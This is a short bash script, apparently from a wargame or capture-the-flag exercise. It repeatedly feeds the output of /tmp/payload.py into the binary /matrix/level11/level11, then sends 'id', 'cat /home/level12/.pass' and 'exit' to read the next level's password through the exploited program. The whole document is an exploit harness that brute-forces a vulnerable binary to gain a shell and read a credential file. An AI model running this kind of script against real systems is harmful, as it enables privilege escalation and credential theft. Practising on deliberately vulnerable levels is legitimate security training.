#!/bin/bash
while true; do
        (python /tmp/payload.py; echo -e "\nid\ncat /home/level12/.pass\nexit\n") | /matrix/level11/level11
done